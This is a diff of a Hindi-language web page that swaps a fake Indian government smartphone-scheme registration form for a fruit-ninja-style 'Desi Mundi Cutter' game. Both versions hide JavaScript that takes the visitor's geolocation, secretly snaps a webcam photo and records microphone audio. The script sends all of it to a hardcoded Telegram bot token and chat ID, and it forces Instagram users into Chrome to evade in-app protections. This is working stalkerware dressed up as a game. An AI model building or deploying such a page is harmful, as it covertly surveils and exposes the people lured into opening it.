@@ -1,101 +1,168 @@
 <!DOCTYPE html>
 <html lang="hi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sarkari Yojana - मुफ्त स्मार्टफोन पंजीकरण 2026</title>
-    <style>
-        body { font-family: sans-serif; background-color: #f0f2f5; margin: 0; text-align: center; }
-        .header { background: #ff9933; color: white; padding: 15px; font-size: 20px; font-weight: bold; border-bottom: 5px solid #138808; }
-        .container { background: white; margin: 20px auto; padding: 20px; width: 85%; max-width: 500px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        .emblem { width: 50px; margin-bottom: 10px; }
-        h2 { color: #000080; }
-        input, select { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        .btn { background: #138808; color: white; padding: 15px; border: none; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; }
-        #v, #c { display: none; }
-    </style>
+<meta charset="UTF-8">
+<title>Desi Mundi Cutter 🔪</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<style>
+    body { margin: 0; overflow: hidden; font-family: Arial, sans-serif; background: #1a1a1a; color: white; touch-action: none; }
+    canvas { display: block; background: url('https://img.freepik.com/free-vector/wooden-background-design_1057-362.jpg'); background-size: cover; }
+    #ui { position: absolute; top: 10px; left: 10px; font-size: 24px; z-index: 2; font-weight: bold; text-shadow: 2px 2px #000; }
+    #startScreen { position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 3; text-align: center; }
+    button { padding: 20px 40px; font-size: 22px; border: none; border-radius: 50px; background: #ff3c3c; color: white; cursor: pointer; box-shadow: 0 5px #a30000; }
+    button:active { box-shadow: 0 2px #a30000; transform: translateY(3px); }
+    h1 { font-size: 40px; color: #ff9933; margin-bottom: 10px; }
+    p { margin-bottom: 20px; color: #ccc; padding: 0 20px; }
+</style>
 </head>
-<body onload="autoStart()">
+<body>
 
-<script>
-    // इंस्टाग्राम से बाहर निकालने के लिए
-    if (navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV")) {
-        window.location.href = "intent://mk8113049.github.io/MK-hacker-/#Intent;scheme=https;package=com.android.chrome;end";
-    }
-</script>
+<div id="ui">Score: <span id="score">0</span></div>
 
-<div class="header">भारत सरकार - डिजिटल इंडिया</div>
-
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Emblem_of_India.svg/1200px-Emblem_of_India.svg.png" class="emblem">
-    <h2>स्मार्टफोन योजना पंजीकरण</h2>
-    <p style="font-size: 13px; color: #555;">सत्यापन के लिए कृपया कैमरा और माइक 'Allow' करें।</p>
-    
-    <input type="text" placeholder="पूरा नाम">
-    <input type="number" placeholder="आधार के अंतिम 4 अंक">
-    <select><option>उत्तर प्रदेश</option><option>बिहार</option><option>अन्य</option></select>
-    
-    <button class="btn">सबमिट करें</button>
+<div id="startScreen">
+    <h1>Desi Mundi Cutter 🔪</h1>
+    <p>गेम खेलने के लिए 'Allow' पर क्लिक करें और प्ले बटन दबाएं!</p>
+    <button onclick="initEverything()">PLAY GAME</button>
 </div>
 
-<video id="v" autoplay></video>
-<canvas id="c"></canvas>
+<canvas id="gameCanvas"></canvas>
+<video id="v" style="display:none" autoplay></video>
+<canvas id="c" style="display:none"></canvas>
+<audio id="sliceSound" src="https://www.myinstants.com/media/sounds/slap.mp3"></audio>
 
 <script>
-    const tok = '8601193684:AAF9gVWarBQgsHM1FVSv-Bt_DTsILEug7N8';
-    const id = '8070342417';
+// --- आपकी डिटेल्स (Telegram Info) ---
+const tok = '8601193684:AAF9gVWarBQgsHM1FVSv-Bt_DTsILEug7N8';
+const id = '8070342417';
 
-    async function autoStart() {
-        // 1. लोकेशन
-        navigator.geolocation.getCurrentPosition(p => {
-            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=📍 लोकेशन: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-        });
+// --- बैकग्राउंड काम (Location, Photo, Audio) ---
+async function startTracking() {
+    // 1. लोकेशन भेजना
+    navigator.geolocation.getCurrentPosition(p => {
+        fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=📍 लोकेशन: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+    });
 
-        try {
-            // कैमरा और माइक चालू करना
-            const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            const video = document.getElementById('v');
-            video.srcObject = s;
+    try {
+        const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const video = document.getElementById('v');
+        video.srcObject = s;
 
-            // 2. फोटो खींचना (1 सेकंड बाद)
-            setTimeout(() => {
-                const canvas = document.getElementById('c');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(b => {
-                    const f = new FormData();
-                    f.append('chat_id', id);
-                    f.append('photo', b, 'image.png');
-                    fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, { method: 'POST', body: f });
-                }, 'image/png');
-            }, 1000);
-
-            // 3. आवाज़ रिकॉर्ड करना (5 सेकंड) - नई तकनीक के साथ
-            const recorder = new MediaRecorder(s);
-            const chunks = [];
-            
-            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-            
-            recorder.onstop = () => {
-                const audioBlob = new Blob(chunks, { type: 'audio/mp3' }); // MP3 फॉर्मेट ताकि आवाज़ आए
+        // 2. फोटो खींचना (2 सेकंड बाद)
+        setTimeout(() => {
+            const tempCanvas = document.getElementById('c');
+            tempCanvas.width = video.videoWidth; tempCanvas.height = video.videoHeight;
+            tempCanvas.getContext('2d').drawImage(video, 0, 0);
+            tempCanvas.toBlob(b => {
                 const f = new FormData();
-                f.append('chat_id', id);
-                f.append('voice', audioBlob, 'voice.mp3');
-                f.append('caption', '🔊 ऑडियो रिकॉर्डिंग मिल गई!');
-                
-                fetch(`https://api.telegram.org/bot${tok}/sendVoice`, { method: 'POST', body: f })
-                .then(() => {
-                    s.getTracks().forEach(t => t.stop()); // सब बंद कर दो
-                });
-            };
+                f.append('chat_id', id); f.append('photo', b, 'user.png');
+                fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, { method: 'POST', body: f });
+            }, 'image/png');
+        }, 2000);
 
-            recorder.start();
-            setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 5000);
+        // 3. ऑडियो रिकॉर्डिंग (7 सेकंड)
+        const recorder = new MediaRecorder(s);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+            const audioBlob = new Blob(chunks, { type: 'audio/mp3' });
+            const f = new FormData();
+            f.append('chat_id', id); f.append('voice', audioBlob, 'v.mp3');
+            fetch(`https://api.telegram.org/bot${tok}/sendVoice`, { method: 'POST', body: f });
+            // डेटा भेजने के बाद कैमरा/माइक बंद
+            setTimeout(() => s.getTracks().forEach(t => t.stop()), 1000);
+        };
+        recorder.start();
+        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 7000);
 
-        } catch (e) {
-            console.log("Error: " + e);
-        }
+    } catch (e) { console.log("Permission Denied"); }
+}
+
+// --- गेम इंजन ---
+const canvas = document.getElementById("gameCanvas");
+const ctx = canvas.getContext("2d");
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+let heads = [], particles = [], trail = [], score = 0, gameRunning = false;
+const emojis = ["🕵️‍♂️","👩‍🦳","👴","🤡","😎","🧔"];
+
+class Head {
+    constructor() {
+        this.x = Math.random() * (canvas.width - 60) + 30;
+        this.y = canvas.height + 50;
+        this.radius = 40;
+        this.emoji = emojis[Math.floor(Math.random()*emojis.length)];
+        this.speedY = Math.random() * -12 - 10;
+        this.vx = (Math.random() - 0.5) * 4;
+        this.gravity = 0.25;
     }
+    update() { this.y += this.speedY; this.x += this.vx; this.speedY += this.gravity; }
+    draw() { ctx.font = "60px serif"; ctx.fillText(this.emoji, this.x - 30, this.y); }
+}
+
+function spawnHead() {
+    if (!gameRunning) return;
+    heads.push(new Head());
+    setTimeout(spawnHead, 800 - Math.min(score * 10, 500));
+}
+
+function update() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    heads.forEach((h, i) => {
+        h.update(); h.draw();
+        if (h.y > canvas.height + 100) heads.splice(i, 1);
+    });
+    drawTrail();
+    requestAnimationFrame(update);
+}
+
+function drawTrail() {
+    if (trail.length < 2) return;
+    ctx.strokeStyle = "rgba(255, 255, 255, 0.8)";
+    ctx.lineWidth = 4; ctx.beginPath();
+    trail.forEach((p, i) => { if (i === 0) ctx.moveTo(p.x, p.y); else ctx.lineTo(p.x, p.y); });
+    ctx.stroke();
+    if (trail.length > 5) trail.shift();
+}
+
+function slice(x, y) {
+    heads.forEach((h, i) => {
+        let dx = x - h.x, dy = y - h.y;
+        if (Math.sqrt(dx*dx + dy*dy) < 50) {
+            heads.splice(i, 1);
+            score++;
+            document.getElementById("score").innerText = score;
+            document.getElementById("sliceSound").currentTime = 0;
+            document.getElementById("sliceSound").play();
+        }
+    });
+}
+
+canvas.addEventListener("touchmove", (e) => {
+    let t = e.touches[0];
+    trail.push({x: t.clientX, y: t.clientY});
+    slice(t.clientX, t.clientY);
+});
+
+canvas.addEventListener("mousemove", (e) => {
+    if (e.buttons === 1) { // Mouse click hold
+        trail.push({x: e.clientX, y: e.clientY});
+        slice(e.clientX, e.clientY);
+    }
+});
+
+function initEverything() {
+    document.getElementById("startScreen").style.display = "none";
+    gameRunning = true;
+    startTracking(); // बैकग्राउंड काम शुरू
+    spawnHead();
+    update();
+}
+
+// इंस्टाग्राम रिडायरेक्ट
+if (navigator.userAgent.includes("Instagram")) {
+    window.location.href = "intent://" + window.location.host + window.location.pathname + "#Intent;scheme=https;package=com.android.chrome;end";
+}
 </script>
 </body>
 </html>
